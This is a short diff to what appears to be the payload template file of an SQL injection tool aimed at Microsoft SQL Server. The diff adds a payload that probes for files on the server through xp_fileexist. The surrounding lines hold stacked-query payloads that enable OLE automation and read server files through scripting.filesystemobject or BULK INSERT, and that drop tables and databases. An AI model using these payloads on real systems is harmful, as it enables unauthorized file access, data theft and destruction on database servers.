@@ -43,5 +43,7 @@ FileBackupCreateTable: 1=1;create table [ssqlinjection]..[data] (content image);
 FileBackupDrop: 1=1;drop table [ssqlinjection]..[data];drop database ssqlinjection;select 1 where 1=1 
 FileReadFso: 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'{path}';if object_id('ssqlinjection') is not null drop table ssqlinjection;create table ssqlinjection (data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into ssqlinjection(data) values(@data);select 1 where 1=1 
 FileReadBulk: 1=1;if object_id('ssqlinjection') is not null drop table ssqlinjection;create table ssqlinjection (data varchar(8000));bulk insert ssqlinjection from '{path}';select 1 where 1=1 
+FileExistCheck: 1=1;if object_id('ssqlinjection') is not null drop table ssqlinjection;create table ssqlinjection (fe int,fd int,pde int);insert into ssqlinjection exec master..xp_fileexist '{path}';select 1 where 1=1 
+FileExistResult:(select cast(fe as varchar(max)) from ssqlinjection)
 FileContent:(select (select cast(data as varchar(max))+char(13)+char(10) from ssqlinjection for xml path(''),type).value('.','varchar(max)'))
 NocastUnicodeValue:unicode(substring({data},{index},1))
